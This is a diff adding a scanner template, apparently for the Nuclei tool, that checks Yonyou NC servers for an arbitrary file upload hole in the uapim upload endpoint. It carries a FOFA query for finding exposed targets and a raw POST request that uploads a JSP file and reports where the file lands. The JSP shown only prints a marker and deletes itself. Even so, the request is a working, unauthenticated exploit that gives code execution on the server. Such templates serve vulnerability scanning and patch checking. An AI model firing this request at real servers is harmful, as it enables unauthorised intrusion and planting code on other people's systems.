@@ -1,0 +1,59 @@
+id: poc-ptrbkq47vtxkg9el
+info:
+  name: 用友NC uapim 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ptrbkq47vtxkg9el'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ptrbkq47vtxkg9el
+    fofa: app="用友-UFIDA-NC" || title="YONYOU NC"
+http:
+- raw:
+  - 'POST /uapim/upload/grouptemplet?groupid=dudesuite&fileType=jsp HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=97jkbhjvvyhvhvuyvug97
+
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+
+    Connection: close
+
+
+
+
+    --97jkbhjvvyhvhvuyvug97
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
+
+
+
+
+    <% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+
+    --97jkbhjvvyhvhvuyvug97--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /uapim/static/pages/dudesuite/head.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
